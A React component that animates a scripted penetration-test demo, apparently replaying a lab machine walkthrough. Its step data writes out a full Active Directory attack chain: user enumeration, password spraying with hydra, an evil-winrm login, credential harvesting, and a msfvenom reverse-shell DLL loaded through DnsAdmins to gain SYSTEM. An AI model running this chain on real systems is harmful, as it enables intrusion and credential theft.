import { useState, useEffect, useRef } from "react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Play, Pause, RotateCcw, Terminal as TerminalIcon } from "lucide-react";
import { useLanguage } from "@/contexts/LanguageContext";

interface PentestStep {
  thought_process: string;
  input: string;
  output: string;
}

const pentestSteps: PentestStep[] = [
  {
    thought_process: "Première étape : reconnaissance. Scan nmap pour identifier les ports ouverts et services.",
    input: "nmap --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.169",
    output: "Starting Nmap 7.80 ( https://nmap.org )\nNmap scan report for 10.10.10.169\nHost is up (0.24s latency)\nPORT      STATE SERVICE      VERSION\n53/tcp    open  domain?\n88/tcp    open  kerberos-sec Microsoft Windows Kerberos\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open  ldap         Microsoft Windows Active Directory LDAP\n445/tcp   open  microsoft-ds Windows Server 2016\n5985/tcp  open  wsman        Microsoft HTTPAPI httpd 2.0"
  },
  {
    thought_process: "LDAP est ouvert. Énumération des contextes Active Directory avec ldapsearch.",
    input: "ldapsearch -h 10.10.10.169 -x -s base namingcontexts",
    output: "# extended LDIF\ndn:\nnamingContexts: DC=megabank,DC=local\nnamingContexts: CN=Configuration,DC=megabank,DC=local\nnamingContexts: CN=Schema,CN=Configuration,DC=megabank,DC=local\n\nsearch: 2\nresult: 0 Success"
  },
  {
    thought_process: "Énumération des utilisateurs du domaine via RPC.",
    input: "rpcclient -U '' 10.10.10.169\nenumdomusers",
    output: "user:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[ryan] rid:[0x451]\nuser:[marko] rid:[0x457]\nuser:[melanie] rid:[0x2775]\nuser:[zach] rid:[0x2776]\nuser:[simon] rid:[0x2777]"
  },
  {
    thought_process: "Recherche de métadonnées utilisateur avec enum4linux.",
    input: "enum4linux 10.10.10.169",
    output: "index: 0x10a9 RID: 0x457 acb: 0x00000210\nAccount: marko\nName: Marko Novak\nDesc: Account created. Password set to Welcome123!\n\n[✓] Mot de passe trouvé dans la description !"
  },
  {
    thought_process: "Password spraying avec le mot de passe trouvé contre tous les utilisateurs.",
    input: "hydra -L users.txt -p Welcome123! smb://10.10.10.169",
    output: "Hydra v9.0 starting...\n[DATA] attacking smb://10.10.10.169:445/\n[STATUS] 4.00 tries/min, 4 tries in 02m01s\n[445][smb] host: 10.10.10.169\n[✓] login: melanie password: Welcome123!\n\n[SUCCESS] Identifiants valides trouvés !"
  },
  {
    thought_process: "Connexion WinRM avec les identifiants de melanie.",
    input: "evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!",
    output: "Evil-WinRM shell v2.3\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\melanie\\Documents>\n\n[✓] Shell obtenu en tant que melanie"
  },
  {
    thought_process: "Énumération post-compromission. Exploration du système de fichiers.",
    input: "dir -Force C:\\",
    output: "Directory: C:\\\n\nMode          LastWriteTime Length Name\nd-----         1/3/2020 12:44 AM      PSTranscripts\nd-r---        1/12/2020  7:38 PM      Users\nd-----        1/12/2020  7:40 PM      Windows\n\n[!] Répertoire PSTranscripts suspect détecté"
  },
  {
    thought_process: "Analyse des transcriptions PowerShell pour trouver des identifiants.",
    input: "get-content C:\\PSTranscripts\\20191203\\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt",
    output: "Windows PowerShell transcript start\nUsername: MEGABANK\\ryan\nHost Application: net use X: \\\\fs01\\backups ryan Serv3r4Admin4cc123!\n\n[✓] Identifiants de 'ryan' trouvés en clair !"
  },
  {
    thought_process: "Connexion avec le compte ryan et vérification des privilèges.",
    input: "whoami /groups",
    output: "GROUP INFORMATION\n\nGroup Name                           Type\nBUILTIN\\Users                        Alias\nBUILTIN\\DnsAdmins                    Alias\nBUILTIN\\Administrators               Alias (deny only)\n\n[!] Membre du groupe DnsAdmins - Escalade possible !"
  },
  {
    thought_process: "Création d'une DLL malveillante avec reverse shell.",
    input: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.23 LPORT=1234 -f dll > plugin.dll",
    output: "[-] No arch selected, selecting arch: x64\nPayload size: 460 bytes\nFinal size of dll file: 8192 bytes\nSaved as: plugin.dll\n\n[✓] Payload généré"
  },
  {
    thought_process: "Configuration du serveur DNS pour charger la DLL malveillante.",
    input: "dnscmd resolute /config /serverlevelplugindll \\\\10.10.14.23\\exploit\\plugin.dll",
    output: "Registry property serverlevelplugindll successfully created.\nCommand completed successfully.\n\n[✓] Configuration DNS modifiée"
  },
  {
    thought_process: "Redémarrage du service DNS pour déclencher le payload.",
    input: "sc.exe \\\\resolute stop dns && sc.exe \\\\resolute start dns",
    output: "SERVICE_NAME: dns\nSTATE      : 3  STOP_PENDING\nSTATE      : 2  START_PENDING\n\n[✓] Service DNS redémarré"
  },
  {
    thought_process: "Vérification du shell SYSTEM reçu.",
    input: "whoami",
    output: "nt authority\\system\n\n[✓✓✓] ACCÈS SYSTÈME COMPLET OBTENU !\n\n═══════════════════════════════════════\n  EXPLOITATION RÉUSSIE\n  Vulnérabilités découvertes :\n  • Mot de passe en clair dans description\n  • Credentials dans transcription PS\n  • Escalade via DnsAdmins\n═══════════════════════════════════════"
  }
];

const PentestTerminal = () => {
  const { t } = useLanguage();
  const [isRunning, setIsRunning] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [displayedText, setDisplayedText] = useState("");
  const [phase, setPhase] = useState<"thought" | "input" | "output">("thought");
  const terminalRef = useRef<HTMLDivElement>(null);
  const [history, setHistory] = useState<Array<{ type: string; content: string }>>([]);
  const charIndexRef = useRef(0);
  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const timeoutsRef = useRef<Array<ReturnType<typeof setTimeout>>>([]);

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [history, displayedText]);

  useEffect(() => {
    if (!isRunning || currentStep >= pentestSteps.length) {
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
        intervalRef.current = null;
      }
      if (currentStep >= pentestSteps.length) {
        setIsRunning(false);
      }
      return;
    }

    const step = pentestSteps[currentStep];
    let content = "";
    
    switch (phase) {
      case "thought":
        content = step.thought_process;
        break;
      case "input":
        content = step.input;
        break;
      case "output":
        content = step.output;
        break;
    }

    const speed = phase === "output" ? 5 : 20;

    intervalRef.current = setInterval(() => {
      if (charIndexRef.current < content.length) {
        setDisplayedText(content.slice(0, charIndexRef.current + 1));
        charIndexRef.current++;
      } else {
        if (intervalRef.current) {
          clearInterval(intervalRef.current);
          intervalRef.current = null;
        }
        
        setHistory(prev => [...prev, { type: phase, content }]);
        setDisplayedText("");
        charIndexRef.current = 0;

        if (phase === "thought") {
          const t1 = setTimeout(() => setPhase("input"), 300);
          timeoutsRef.current.push(t1);
        } else if (phase === "input") {
          const t2 = setTimeout(() => setPhase("output"), 300);
          timeoutsRef.current.push(t2);
        } else {
          const t3 = setTimeout(() => {
            setPhase("thought");
            setCurrentStep(prev => prev + 1);
          }, 500);
          timeoutsRef.current.push(t3);
        }
      }
    }, speed);

    return () => {
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
        intervalRef.current = null;
      }
    };
  }, [isRunning, currentStep, phase]);

  const handleStart = () => {
    if (currentStep >= pentestSteps.length) {
      handleReset();
      setIsRunning(true);
      return;
    }

    const step = pentestSteps[currentStep];
    let content = "";
    switch (phase) {
      case "thought":
        content = step.thought_process;
        break;
      case "input":
        content = step.input;
        break;
      case "output":
        content = step.output;
        break;
    }

    if (displayedText === "" && history.length > 0) {
      const last = history[history.length - 1];
      if (last.type === phase && last.content === content) {
        if (phase === "thought") setPhase("input");
        else if (phase === "input") setPhase("output");
        else {
          setPhase("thought");
          setCurrentStep((prev) => prev + 1);
        }
      }
    }

    setIsRunning(true);
  };

  const handlePause = () => {
    setIsRunning(false);
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
      intervalRef.current = null;
    }
    if (timeoutsRef.current.length) {
      timeoutsRef.current.forEach((t) => clearTimeout(t));
      timeoutsRef.current = [];
    }
  };

  const handleReset = () => {
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
      intervalRef.current = null;
    }
    if (timeoutsRef.current.length) {
      timeoutsRef.current.forEach((t) => clearTimeout(t));
      timeoutsRef.current = [];
    }
    setIsRunning(false);
    setCurrentStep(0);
    setPhase("thought");
    setDisplayedText("");
    setHistory([]);
    charIndexRef.current = 0;
  };

  return (
    <div className="space-y-6">
      {!isRunning && currentStep === 0 && history.length === 0 && (
        <div className="text-center space-y-6 py-8 px-4 bg-gradient-to-b from-primary/5 to-transparent rounded-lg border border-primary/20">
          <div className="space-y-3">
            <div className="inline-flex items-center gap-2 px-4 py-2 bg-primary/10 rounded-full border border-primary/20">
              <div className="w-2 h-2 bg-primary rounded-full animate-pulse"></div>
              <span className="text-sm font-medium text-primary">{t('terminal.ready')}</span>
            </div>
            <h3 className="text-2xl font-bold">
              {t('terminal.watch')} <span className="text-gradient">{t('terminal.action')}</span>
            </h3>
            <p className="text-muted-foreground max-w-xl mx-auto">
              {t('terminal.intro')}
            </p>
          </div>
          
          <Button
            size="lg"
            variant="hero"
            onClick={handleStart}
            className="h-12 px-6 text-base md:h-14 md:px-8 md:text-lg"
          >
            <Play className="w-4 h-4 md:w-5 md:h-5 mr-2" />
            {t('terminal.launch')}
          </Button>
          
          <p className="text-sm text-muted-foreground">
            {t('terminal.duration')}
          </p>
        </div>
      )}

      <Card className="bg-card border-primary/20 overflow-hidden">
        <div className="bg-secondary/50 border-b border-primary/20 px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <TerminalIcon className="w-5 h-5 text-primary" />
            <span className="font-mono text-sm font-semibold">{t('terminal.title')}</span>
          </div>
          <div className="flex items-center gap-2">
            <>
              <Button
                size="sm"
                variant="ghost"
                onClick={isRunning ? handlePause : handleStart}
                className="h-8 px-3"
              >
                {isRunning ? (
                  <>
                    <Pause className="w-4 h-4 mr-1" />
                    {t('terminal.pause')}
                  </>
                ) : (
                  <>
                    <Play className="w-4 h-4 mr-1" />
                    {currentStep >= pentestSteps.length 
                      ? t('terminal.replay')
                      : (currentStep === 0 && history.length === 0 && displayedText === "" 
                        ? t('terminal.play')
                        : t('terminal.resume'))}
                  </>
                )}
              </Button>
              <Button
                size="sm"
                variant="ghost"
                onClick={handleReset}
                className="h-8 px-3"
              >
                <RotateCcw className="w-4 h-4 mr-1" />
                {t('terminal.reset')}
              </Button>
            </>
          </div>
        </div>

        <div 
          ref={terminalRef}
          className="bg-background/50 p-6 font-mono text-sm h-[600px] overflow-y-auto space-y-4"
        >
          {history.map((item, index) => (
            <div key={index} className="space-y-2">
              {item.type === "thought" && (
                <div className="text-muted-foreground italic">
                  # {item.content}
                </div>
              )}
              {item.type === "input" && (
                <div className="text-primary font-semibold">
                  <span className="text-accent">fleuret@pentest</span>
                  <span className="text-muted-foreground">:</span>
                  <span className="text-primary-glow">~</span>
                  <span className="text-muted-foreground">$ </span>
                  {item.content}
                </div>
              )}
              {item.type === "output" && (
                <pre className="text-foreground/90 whitespace-pre-wrap leading-relaxed">
                  {item.content}
                </pre>
              )}
            </div>
          ))}

          {displayedText && (
            <div className="space-y-2">
              {phase === "thought" && (
                <div className="text-muted-foreground italic">
                  # {displayedText}
                  <span className="animate-pulse">▊</span>
                </div>
              )}
              {phase === "input" && (
                <div className="text-primary font-semibold">
                  <span className="text-accent">fleuret@pentest</span>
                  <span className="text-muted-foreground">:</span>
                  <span className="text-primary-glow">~</span>
                  <span className="text-muted-foreground">$ </span>
                  {displayedText}
                  <span className="animate-pulse">▊</span>
                </div>
              )}
              {phase === "output" && (
                <pre className="text-foreground/90 whitespace-pre-wrap leading-relaxed">
                  {displayedText}
                  <span className="animate-pulse">▊</span>
                </pre>
              )}
            </div>
          )}

          {!isRunning && currentStep === 0 && history.length === 0 && (
            <div className="text-center text-muted-foreground py-12">
              <TerminalIcon className="w-12 h-12 mx-auto mb-4 text-primary/50" />
              <p className="text-lg mb-2">{t('terminal.ready.title')}</p>
              <p className="text-sm">{t('terminal.ready.desc')}</p>
            </div>
          )}
        </div>
      </Card>
    </div>
  );
};

export default PentestTerminal;